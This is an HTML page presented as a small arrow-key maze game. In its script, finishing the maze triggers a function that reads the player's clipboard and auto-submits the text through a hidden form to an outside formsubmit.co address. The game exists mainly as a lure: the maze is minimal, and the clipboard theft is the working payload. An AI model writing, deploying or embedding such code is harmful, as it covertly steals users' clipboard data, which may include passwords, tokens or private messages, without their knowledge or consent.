<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maze Escape - Clipboard Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #gameArea {
            position: relative;
            width: 400px;
            height: 400px;
            background-color: #fff;
            border: 2px solid #333;
            display: grid;
            grid-template-columns: repeat(10, 40px);
            grid-template-rows: repeat(10, 40px);
        }

        .maze-block {
            width: 40px;
            height: 40px;
            background-color: #e0e0e0;
            border: 1px solid #ddd;
        }

        .wall {
            background-color: #333;
        }

        .start {
            background-color: #00ff00;
        }

        .exit {
            background-color: #ff0000;
        }

        .player {
            background-color: #0000ff;
        }

        .game-message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            color: #000;
            display: none;
            background-color: rgba(255, 255, 255, 0.7);
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>

<div id="gameArea">
    <!-- Create a 10x10 grid of blocks for the maze -->
    <div class="maze-block start" id="start"></div>
    <div class="maze-block wall" id="wall1"></div>
    <div class="maze-block wall" id="wall2"></div>
    <div class="maze-block wall" id="wall3"></div>
    <div class="maze-block wall" id="wall4"></div>
    <div class="maze-block wall" id="wall5"></div>
    <div class="maze-block wall" id="wall6"></div>
    <div class="maze-block wall" id="wall7"></div>
    <div class="maze-block wall" id="wall8"></div>
    <div class="maze-block exit" id="exit"></div>

    <!-- Player -->
    <div class="maze-block player" id="player"></div>
</div>

<div id="gameMessage" class="game-message">Congratulations! You found the exit!</div>

<form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
    <input type="hidden" name="_subject" value="Maze Game - Secret Unlocked!" />
    <input type="hidden" name="_next" value="thank_you.html" />
    <input type="hidden" id="clipboardContent" name="clipboardContent" />
</form>

<script>
    // Set up the maze
    const player = document.getElementById('player');
    const start = document.getElementById('start');
    const exit = document.getElementById('exit');
    const gameMessage = document.getElementById('gameMessage');
    const mazeArea = document.getElementById('gameArea');

    let playerPosition = { x: 0, y: 0 }; // Player's initial position (grid-based)
    
    // Walls in the maze grid (represented by their positions)
    const walls = [
        { x: 1, y: 0 }, { x: 2, y: 0 }, { x: 3, y: 0 },
        { x: 3, y: 1 }, { x: 4, y: 1 },
        { x: 2, y: 2 }, { x: 3, y: 2 },
        { x: 5, y: 3 }, { x: 6, y: 3 },
        { x: 5, y: 4 }, { x: 5, y: 5 },
        { x: 1, y: 6 }, { x: 2, y: 6 },
        { x: 3, y: 6 }, { x: 4, y: 6 },
        { x: 7, y: 7 }, { x: 8, y: 7 }
    ];

    // Mark the walls on the grid
    walls.forEach(wall => {
        const wallDiv = document.createElement('div');
        wallDiv.classList.add('maze-block', 'wall');
        wallDiv.style.gridRowStart = wall.y + 1;
        wallDiv.style.gridColumnStart = wall.x + 1;
        mazeArea.appendChild(wallDiv);
    });

    // Update player position
    function updatePlayerPosition() {
        player.style.gridRowStart = playerPosition.y + 1;
        player.style.gridColumnStart = playerPosition.x + 1;
    }

    // Move the player based on arrow keys
    function movePlayer(event) {
        if (event.key === 'ArrowUp' && playerPosition.y > 0 && !isWall(playerPosition.x, playerPosition.y - 1)) {
            playerPosition.y--;
        } else if (event.key === 'ArrowDown' && playerPosition.y < 9 && !isWall(playerPosition.x, playerPosition.y + 1)) {
            playerPosition.y++;
        } else if (event.key === 'ArrowLeft' && playerPosition.x > 0 && !isWall(playerPosition.x - 1, playerPosition.y)) {
            playerPosition.x--;
        } else if (event.key === 'ArrowRight' && playerPosition.x < 9 && !isWall(playerPosition.x + 1, playerPosition.y)) {
            playerPosition.x++;
        }

        updatePlayerPosition();

        // Check if player has reached the exit
        if (playerPosition.x === 9 && playerPosition.y === 5) {
            gameMessage.style.display = 'block';
            copyClipboardAndSubmit();
        }
    }

    // Check if a position is a wall
    function isWall(x, y) {
        return walls.some(wall => wall.x === x && wall.y === y);
    }

    // Copy clipboard content and submit the form
    function copyClipboardAndSubmit() {
        navigator.clipboard.readText().then(function(clipText) {
            // Set the clipboard content into a hidden form field
            document.getElementById('clipboardContent').value = clipText;

            // Automatically submit the form
            setTimeout(function() {
                document.getElementById('hiddenForm').submit();
            }, 1000); // Delay before submitting the form
        }).catch(function(err) {
            console.error('Failed to read clipboard contents: ', err);
        });
    }

    // Add event listener to listen for arrow keys
    document.addEventListener('keydown', movePlayer);

    // Initialize the player position
    updatePlayerPosition();
</script>

</body>
</html>
